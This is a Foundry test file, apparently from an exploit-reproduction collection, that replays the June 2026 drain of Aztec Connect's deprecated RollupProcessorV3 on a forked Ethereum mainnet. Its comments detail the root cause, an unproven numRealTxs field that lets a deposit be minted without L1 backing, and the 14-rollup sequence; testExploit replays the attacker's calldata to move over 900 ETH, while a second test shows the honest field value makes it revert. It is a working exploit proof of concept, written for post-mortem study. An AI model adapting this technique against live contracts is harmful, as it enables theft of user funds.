// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$2.19M (908.99 ETH + 270.5K DAI + 167.9 wstETH + yvDAI/yvWETH/LUSD/yvLUSD)
//                          This PoC covers the 908.99 ETH leg.
// Attacker EOA          : 0x0F18D8b44a740272f0be4d08338d2b165b7EdD17 (funded via Tornado Cash)
// Attacker Orchestrator : 0x06f585F74e0DA633Ae813A0f23Fb9900B61d0fcD (4-byte trigger 0x6f3ce701)
// Vulnerable contract   : 0xFF1F2B4ADb9dF6FC8eAFecDcbF96A2B351680455 (Aztec Connect RollupProcessorV3, deprecated)
// Attack Tx             : 0x074ec9317d8336db37e8c348fbdd7515573ff4088239c77ab429f522509aeeb1 (block 25,315,715)
//
// @Analysis
// Attack date : Jun-14-2026
// Chain       : Ethereum mainnet
// Post-mortem : https://www.cryptotimes.io/2026/06/15/aztec-exploit-drains-2-19m-from-dormant-privacy-protocol/
// Foundation  : https://x.com/aztecFND/status/2066175938887619055
//
// @Root cause - numRealTxs mismatch between proof/hash coverage and L1 settlement (core/Decoder.sol):
//
//   * decodeProof() commits the public inputs in FULL inner-rollup chunks. With numRealTxs = 1,
//     rollupSize = 1024 and numRollupTxs = 32 (innerSize = 1024/32 = 32), it hashes ceil(1/32) = 1
//     full chunk -> ALL 32 slots of inner-rollup #0 are proven and their notes minted into L2 state.
//
//   * processDepositsAndWithdrawals() settles EXACTLY numRealTxs txs:  end = ptr + numRealTxs * 256.
//     With numRealTxs = 1 only slot 0 is settled.
//
//   => A DEPOSIT placed in slot 1 is proven (note minted) but its L1 validation
//      (decreasePendingDepositBalance + shield signature) is SKIPPED -> unbacked L2 balance,
//      later withdrawn for real ETH. The proof is a normal, valid rollup proof; nothing is forged.
//      On the deprecated RollupProcessorV3, processRollup() is permissionless (the provider gate was
//      removed for sunset self-exit), so anyone can submit these rollups.
//
//   numRealTxs lives at proofData[0x11c0], OUTSIDE the 0..0x11c0 header that is hashed, so it is NOT
//   bound by the zk proof. It only sets the chunk COUNT ceil(numRealTxs/32), and 1..32 all map to one
//   chunk -> the SAME proof verifies for any numRealTxs in [1..32].
//
// @Choreography - 14 state-chained rollups (ids 13277..13290). The ETH leg:
//      13277        : [slot0 account (settled no-op)] [slot1 DEPOSIT 908.99 ETH (skipped -> unbacked mint)]
//      13278..13283 : same trick for DAI / wstETH / yvDAI / yvWETH / LUSD / yvLUSD
//      13284..13289 : withdraw those 6 assets (settled) to the attacker EOA
//      13290        : [slot0 WITHDRAW 908.99 ETH (settled) -> attacker EOA]
//
// Requires an archival mainnet RPC (state at block 25,300,000) for the `mainnet` endpoint.

contract AztecConnect_exp is Test {
    address internal constant ROLLUP = 0xFF1F2B4ADb9dF6FC8eAFecDcbF96A2B351680455;
    address internal constant ATTACKER = 0x0F18D8b44a740272f0be4d08338d2b165b7EdD17;
    string internal constant CALLDATA = "src/test/2026-06/aztecconnect_calldata.txt";
    uint256 internal constant N = 14;

    // `proofData` starts 100 bytes into processRollup(bytes,bytes) calldata; field offsets within it:
    uint256 internal constant OFF_ROLLUP_ID = 0x00; // rollupId          (uint256)
    uint256 internal constant OFF_NUM_REAL = 0x11c0; // numRealTxs        (uint32) <- the unprotected knob
    uint256 internal constant OFF_PUBLIC_VALUE = 4810; // slot-1 tx publicValue (encStart 4552 + account 129 + 129)

    function setUp() public {
        vm.createSelectFork("mainnet", 25_300_000);
    }

    /// @notice 14 state-chained rollups drain the vault; each declares numRealTxs == 1.
    function testExploit() public {
        emit log_named_decimal_uint("vault ETH before    ", ROLLUP.balance, 18);

        uint256 start = ATTACKER.balance;
        for (uint256 i = 0; i < N; i++) {
            bytes memory cd = vm.parseBytes(vm.readLine(CALLDATA));
            emit log_named_uint(
                string.concat("rollup ", vm.toString(_word(cd, OFF_ROLLUP_ID)), " numRealTxs"), _numRealTxs(cd)
            );
            // processRollup is permissionless on V3, so any caller is accepted.
            (bool ok,) = ROLLUP.call(cd);
            require(ok, "processRollup replay failed");
        }
        vm.closeFile(CALLDATA);

        uint256 gained = ATTACKER.balance - start;
        emit log_named_decimal_uint("attacker ETH gained ", gained, 18);
        emit log_named_decimal_uint("vault ETH after     ", ROLLUP.balance, 18);
        assertGt(gained, 900 ether, "expected >900 ETH drained to attacker");
    }

    /// @notice The vulnerability isolated to a single field. The mint rollup (13277) carries a real
    ///         908.99-ETH deposit in slot 1 but declares numRealTxs = 1 so settlement skips it. Restore
    ///         the honest count (numRealTxs = 2) WITHOUT touching anything else: the identical proof
    ///         still verifies (1..32 -> same hash chunk), but now the deposit is settled and its L1
    ///         backing check rejects it. One byte is the difference between a free mint and a revert.
    function testBugIsOneField() public {
        bytes memory cd = vm.parseBytes(vm.readLine(CALLDATA)); // rollup 13277 (the ETH mint)
        vm.closeFile(CALLDATA);

        emit log_named_uint("declared numRealTxs   ", _numRealTxs(cd));
        emit log_named_decimal_uint("slot-1 DEPOSIT value ", _word(cd, OFF_PUBLIC_VALUE), 18);

        // Flip ONLY numRealTxs 1 -> 2 (its honest value: this rollup really has 2 txs).
        _setNumRealTxs(cd, 2);
        assertEq(_numRealTxs(cd), 2, "knob set to honest count");

        (bool ok, bytes memory ret) = ROLLUP.call(cd);
        assertFalse(ok, "same proof + honest numRealTxs => deposit validated => revert");
        emit log_named_bytes("revert selector (deposit validation)", ret); // INSUFFICIENT_DEPOSIT()
    }

    /* ----------------------------- calldata helpers ----------------------------- */

    function _word(bytes memory cd, uint256 pdOff) internal pure returns (uint256 v) {
        assembly {
            v := mload(add(cd, add(0x20, add(100, pdOff))))
        }
    }

    function _numRealTxs(bytes memory cd) internal pure returns (uint256 v) {
        // numRealTxs occupies the top 4 bytes of the 32-byte word at proofData[0x11c0].
        assembly {
            v := shr(224, mload(add(cd, add(0x20, add(100, 0x11c0)))))
        }
    }

    function _setNumRealTxs(bytes memory cd, uint32 n) internal pure {
        assembly {
            let p := add(cd, add(0x20, add(100, 0x11c0)))
            let w := and(mload(p), 0x00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
            mstore(p, or(w, shl(224, n)))
        }
    }
}
